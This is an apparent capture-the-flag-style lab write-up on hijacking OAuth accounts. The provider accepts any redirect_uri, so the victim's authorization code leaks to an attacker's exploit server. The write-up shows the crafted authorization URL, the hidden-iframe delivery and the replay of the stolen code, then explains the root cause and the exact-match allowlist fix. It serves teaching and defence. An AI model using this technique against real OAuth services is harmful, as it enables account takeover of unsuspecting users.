# Lab 3 OAuth account hijacking via redirect\_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

***

## Feature Being Attacked

Standard OAuth login ("log in with social media") using the **authorization code** flow. Since the victim already has an active session with the OAuth provider, the flow completes silently - no re-login needed, just redirect → code → callback.

## Key Problem

**The OAuth server does not validate `redirect_uri` strictly.** It accepts _any_ arbitrary value for `redirect_uri` in the initial authorization request:

```
GET /auth?client_id=...&redirect_uri=ANYTHING&response_type=code&scope=...
```

Since the OAuth server doesn't check this against a pre-registered allowlist (or only does a weak/no check), the attacker can redirect the flow's output - the **authorization code** - to a domain **they control** instead of the legitimate client app.

## The Exploit Logic

1. Attacker crafts a malicious authorization URL with `redirect_uri` pointing to their **exploit server**:

```
   https://oauth-server.net/auth?client_id=...&redirect_uri=https://exploit-server.net&response_type=code&scope=openid%20profile%20email
```

2. Embeds this in a hidden `<iframe>` on the exploit server
3. Victim (who has an **active OAuth session**) visits the page → iframe silently loads → OAuth server sees an authenticated session → auto-completes the flow → redirects to the attacker's `redirect_uri` **with the victim's authorization code attached**
4. Code lands in the **attacker's exploit server access logs**
5. Attacker takes that stolen `code` and manually visits the real client's callback:

```
   https://blog-website.net/oauth-callback?code=STOLEN-CODE
```

6. Client exchanges the code for a token as normal → logs the attacker in **as the victim**

## Root Cause

> The OAuth server trusts a client-supplied `redirect_uri` without validating it against the value registered for that `client_id`. Since the authorization code is the "keys to the kingdom" (exchangeable for a token/session), letting it be redirected anywhere defeats the entire security model - the code silently leaks to any attacker-controlled destination via a simple redirect.

This differs from the CSRF-based linking lab: here the attacker doesn't need the victim to submit anything sensitive - the **victim's own already-authenticated session does all the work**, simply by loading an iframe.

## The Fix

* OAuth server must **strictly validate `redirect_uri`** against an **exact-match allowlist** registered per `client_id` at setup time
* No wildcards, no prefix matching, no "any subdomain of X" - exact string match only
* Reject the authorization request entirely if `redirect_uri` doesn't match what was registered

## One-Line Takeaway

> The `redirect_uri` is not just cosmetic - it's the destination for the most sensitive artifact in the flow (the authorization code). If the OAuth server doesn't pin it to an exact, pre-registered value, an attacker can redirect that code straight into their own hands using nothing but a silent iframe load.
